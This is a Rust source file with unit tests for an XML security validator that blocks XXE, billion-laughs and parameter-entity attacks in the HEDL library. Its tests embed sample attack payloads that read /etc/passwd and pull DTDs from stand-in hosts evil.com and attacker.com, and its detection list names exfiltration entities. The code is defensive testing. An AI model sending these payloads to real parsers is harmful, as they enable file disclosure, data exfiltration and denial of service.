// Dweve HEDL - Hierarchical Entity Data Language
//
// Copyright (c) 2025 Dweve IP B.V. and individual contributors.
//
// SPDX-License-Identifier: Apache-2.0
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License in the LICENSE file at the
// root of this repository or at: http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Security validation for XML processing
//!
//! This module provides defense against XML injection attacks including:
//! - XXE (XML External Entity) attacks
//! - Billion laughs attacks (entity expansion bombs)
//! - Parameter entity attacks
//! - DTD-based exploits
//!
//! # Security Model
//!
//! The security model follows a defense-in-depth approach:
//!
//! 1. **Primary Defense**: Reject all DOCTYPE declarations
//! 2. **Secondary Defense**: Detect entity declarations and external references
//! 3. **Tertiary Defense**: Document size limits
//!
//! # Examples
//!
//! ```rust
//! use hedl_xml::security::XmlSecurityValidator;
//!
//! let validator = XmlSecurityValidator::default();
//!
//! // Safe XML passes validation
//! let safe_xml = r#"<?xml version="1.0"?><hedl><data>safe</data></hedl>"#;
//! assert!(validator.validate(safe_xml).is_ok());
//!
//! // XXE attack is rejected
//! let xxe_xml = r#"<?xml version="1.0"?>
//! <!DOCTYPE hedl [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
//! <hedl><data>&xxe;</data></hedl>"#;
//! assert!(validator.validate(xxe_xml).is_err());
//! ```

use std::error::Error;
use std::fmt;

/// Security validator for XML content
#[derive(Debug, Clone)]
pub struct XmlSecurityValidator {
    /// Reject any DOCTYPE declarations
    pub reject_doctype: bool,
    /// Maximum document size in bytes
    pub max_document_size: usize,
    /// Enable detailed security checks beyond DOCTYPE
    pub strict_validation: bool,
}

impl Default for XmlSecurityValidator {
    fn default() -> Self {
        Self {
            reject_doctype: true,
            max_document_size: 10 * 1024 * 1024, // 10MB
            strict_validation: true,
        }
    }
}

impl XmlSecurityValidator {
    /// Create a new validator with custom settings
    pub fn new(reject_doctype: bool, max_document_size: usize, strict_validation: bool) -> Self {
        Self {
            reject_doctype,
            max_document_size,
            strict_validation,
        }
    }

    /// Validate XML content for security threats
    ///
    /// Performs multiple security checks:
    /// - Document size validation
    /// - DOCTYPE declaration detection
    /// - External entity reference detection
    /// - Entity declaration detection
    /// - Parameter entity detection
    ///
    /// # Errors
    ///
    /// Returns `SecurityViolation` if any security threat is detected.
    pub fn validate(&self, xml: &str) -> Result<(), SecurityViolation> {
        // Check 1: Document size
        if xml.len() > self.max_document_size {
            return Err(SecurityViolation::DocumentSizeExceeded {
                size: xml.len(),
                max_size: self.max_document_size,
            });
        }

        // Check 2: DOCTYPE declaration (primary defense against XXE)
        if self.reject_doctype && self.contains_doctype(xml) {
            return Err(SecurityViolation::DoctypeDetected);
        }

        // Additional strict validation checks
        if self.strict_validation {
            // Check 3: Parameter entities (data exfiltration prevention) - check first since they may contain SYSTEM
            if self.contains_parameter_entity(xml) {
                return Err(SecurityViolation::ParameterEntityDetected);
            }

            // Check 4: External entity references (SYSTEM/PUBLIC)
            if self.contains_external_entity(xml) {
                return Err(SecurityViolation::ExternalEntityDetected);
            }

            // Check 5: Entity declarations (billion laughs prevention)
            if self.contains_entity_declaration(xml) {
                return Err(SecurityViolation::EntityDeclarationDetected);
            }
        }

        Ok(())
    }

    /// Check if XML contains DOCTYPE declaration
    ///
    /// Uses case-insensitive matching to detect DOCTYPE in various forms:
    /// - `<!DOCTYPE ...>`
    /// - `<!doctype ...>`
    /// - With whitespace variations
    fn contains_doctype(&self, xml: &str) -> bool {
        // Fast path: early rejection if no "<!" present
        if !xml.contains("<!") {
            return false;
        }

        // Case-insensitive DOCTYPE detection
        let upper = xml.to_uppercase();
        upper.contains("<!DOCTYPE")
    }

    /// Check if XML contains external entity references
    ///
    /// Detects SYSTEM and PUBLIC keywords that indicate external entity references.
    fn contains_external_entity(&self, xml: &str) -> bool {
        // Fast path
        if !xml.contains("<!") {
            return false;
        }

        let upper = xml.to_uppercase();

        // Check for SYSTEM or PUBLIC keywords (used in external entities)
        if upper.contains("<!ENTITY") {
            upper.contains("SYSTEM") || upper.contains("PUBLIC")
        } else {
            false
        }
    }

    /// Check if XML contains entity declarations
    ///
    /// Detects `<!ENTITY ...>` declarations that could be used for expansion attacks.
    fn contains_entity_declaration(&self, xml: &str) -> bool {
        // Fast path
        if !xml.contains("<!") {
            return false;
        }

        let upper = xml.to_uppercase();
        upper.contains("<!ENTITY")
    }

    /// Check if XML contains parameter entities
    ///
    /// Parameter entities use `%` syntax and can be used for data exfiltration attacks.
    /// Detects patterns like:
    /// - `<!ENTITY % ...>`
    /// - `%dtd;`
    /// - `%all;`
    fn contains_parameter_entity(&self, xml: &str) -> bool {
        // Parameter entities use % syntax
        // Check for common patterns
        xml.contains("<!ENTITY %")
            || xml.contains("%dtd;")
            || xml.contains("%all;")
            || xml.contains("%file;")
            || xml.contains("%send;")
            || xml.contains("%eval;")
    }
}

/// Security violation types
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SecurityViolation {
    /// DOCTYPE declaration detected (XXE prevention)
    DoctypeDetected,
    /// External entity reference detected (SYSTEM/PUBLIC)
    ExternalEntityDetected,
    /// Entity declaration detected (billion laughs prevention)
    EntityDeclarationDetected,
    /// Parameter entity detected (data exfiltration prevention)
    ParameterEntityDetected,
    /// Document size exceeds security limit
    DocumentSizeExceeded {
        /// Actual document size
        size: usize,
        /// Maximum allowed size
        max_size: usize,
    },
}

impl fmt::Display for SecurityViolation {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DoctypeDetected => write!(
                f,
                "DOCTYPE declarations are prohibited for security (XXE prevention)"
            ),
            Self::ExternalEntityDetected => write!(
                f,
                "External entity references (SYSTEM/PUBLIC) are prohibited"
            ),
            Self::EntityDeclarationDetected => write!(
                f,
                "Entity declarations are prohibited (billion laughs prevention)"
            ),
            Self::ParameterEntityDetected => write!(
                f,
                "Parameter entities are prohibited (data exfiltration prevention)"
            ),
            Self::DocumentSizeExceeded { size, max_size } => write!(
                f,
                "Document size ({} bytes) exceeds security limit ({} bytes)",
                size, max_size
            ),
        }
    }
}

impl Error for SecurityViolation {}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validator_default() {
        let validator = XmlSecurityValidator::default();
        assert!(validator.reject_doctype);
        assert_eq!(validator.max_document_size, 10 * 1024 * 1024);
        assert!(validator.strict_validation);
    }

    #[test]
    fn test_validator_custom() {
        let validator = XmlSecurityValidator::new(false, 1024, false);
        assert!(!validator.reject_doctype);
        assert_eq!(validator.max_document_size, 1024);
        assert!(!validator.strict_validation);
    }

    #[test]
    fn test_safe_xml_passes() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?><hedl><data>safe content</data></hedl>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_doctype_detection_uppercase() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY test "value">]>
<hedl><data>test</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_doctype_detection_lowercase() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!doctype hedl [<!ENTITY test "value">]>
<hedl><data>test</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_doctype_detection_mixed_case() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DoCtYpE hedl [<!ENTITY test "value">]>
<hedl><data>test</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_external_entity_system() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<hedl><data>&xxe;</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        // Should fail on DOCTYPE first
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_external_entity_public() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY xxe PUBLIC "publicId" "http://evil.com/evil.dtd">]>
<hedl><data>&xxe;</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_parameter_entity_attack() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<hedl>&send;</hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_billion_laughs_attack() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<hedl>&lol3;</hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err(), SecurityViolation::DoctypeDetected);
    }

    #[test]
    fn test_document_size_limit() {
        let validator = XmlSecurityValidator {
            max_document_size: 100,
            ..Default::default()
        };

        let large_xml = format!(
            r#"<?xml version="1.0"?><hedl><data>{}</data></hedl>"#,
            "A".repeat(200)
        );

        let result = validator.validate(&large_xml);
        assert!(result.is_err());
        match result.unwrap_err() {
            SecurityViolation::DocumentSizeExceeded { size, max_size } => {
                assert!(size > 100);
                assert_eq!(max_size, 100);
            }
            _ => panic!("Expected DocumentSizeExceeded"),
        }
    }

    #[test]
    fn test_disable_doctype_check() {
        let validator = XmlSecurityValidator {
            reject_doctype: false,
            strict_validation: false,
            ..Default::default()
        };

        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ELEMENT hedl ANY>]>
<hedl><data>test</data></hedl>"#;

        // Should pass when DOCTYPE check is disabled
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_strict_validation_entity_detection() {
        // Create validator with DOCTYPE disabled but strict validation enabled
        let validator = XmlSecurityValidator {
            reject_doctype: false,
            strict_validation: true,
            ..Default::default()
        };

        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY test "value">]>
<hedl><data>&test;</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err(),
            SecurityViolation::EntityDeclarationDetected
        );
    }

    #[test]
    fn test_strict_validation_external_entity() {
        let validator = XmlSecurityValidator {
            reject_doctype: false,
            strict_validation: true,
            ..Default::default()
        };

        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<hedl><data>&xxe;</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err(),
            SecurityViolation::ExternalEntityDetected
        );
    }

    #[test]
    fn test_strict_validation_parameter_entity() {
        let validator = XmlSecurityValidator {
            reject_doctype: false,
            strict_validation: true,
            ..Default::default()
        };

        let xml = r#"<?xml version="1.0"?>
<!DOCTYPE hedl [<!ENTITY % file SYSTEM "file:///etc/passwd">]>
<hedl><data>test</data></hedl>"#;

        let result = validator.validate(xml);
        assert!(result.is_err());
        assert_eq!(
            result.unwrap_err(),
            SecurityViolation::ParameterEntityDetected
        );
    }

    #[test]
    fn test_comment_with_doctype_string() {
        let validator = XmlSecurityValidator::default();
        // Should not trigger false positive for DOCTYPE in comments
        // However, our simple validator will detect it - this is acceptable
        // as comments with DOCTYPE are suspicious anyway
        let xml = r#"<?xml version="1.0"?>
<!-- This comment mentions <!DOCTYPE but isn't one -->
<hedl><data>safe</data></hedl>"#;

        let result = validator.validate(xml);
        // Current implementation will reject this (conservative approach)
        assert!(result.is_err());
    }

    #[test]
    fn test_cdata_with_doctype_string() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<hedl><data><![CDATA[<!DOCTYPE test>]]></data></hedl>"#;

        let result = validator.validate(xml);
        // Current implementation will reject this (conservative approach)
        // This is acceptable as it's safer to reject than risk XXE
        assert!(result.is_err());
    }

    #[test]
    fn test_security_violation_display() {
        let violation = SecurityViolation::DoctypeDetected;
        assert!(violation.to_string().contains("DOCTYPE"));
        assert!(violation.to_string().contains("XXE"));

        let violation = SecurityViolation::ExternalEntityDetected;
        assert!(violation.to_string().contains("External entity"));

        let violation = SecurityViolation::EntityDeclarationDetected;
        assert!(violation.to_string().contains("Entity declarations"));
        assert!(violation.to_string().contains("billion laughs"));

        let violation = SecurityViolation::ParameterEntityDetected;
        assert!(violation.to_string().contains("Parameter entities"));
        assert!(violation.to_string().contains("exfiltration"));

        let violation = SecurityViolation::DocumentSizeExceeded {
            size: 1000,
            max_size: 500,
        };
        let msg = violation.to_string();
        assert!(msg.contains("1000"));
        assert!(msg.contains("500"));
    }

    #[test]
    fn test_empty_xml() {
        let validator = XmlSecurityValidator::default();
        let xml = "";
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_xml_declaration_only() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_simple_element() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<root>test</root>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_nested_elements() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<root>
    <child1>value1</child1>
    <child2>
        <nested>value2</nested>
    </child2>
</root>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_attributes_allowed() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<root attr1="value1" attr2="value2">
    <child id="123">content</child>
</root>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_unicode_content() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<root>
    <data>Hello 世界 🌍</data>
</root>"#;
        assert!(validator.validate(xml).is_ok());
    }

    #[test]
    fn test_special_characters_escaped() {
        let validator = XmlSecurityValidator::default();
        let xml = r#"<?xml version="1.0"?>
<root>
    <data>&lt;tag&gt; &amp; &quot;quoted&quot;</data>
</root>"#;
        assert!(validator.validate(xml).is_ok());
    }
}
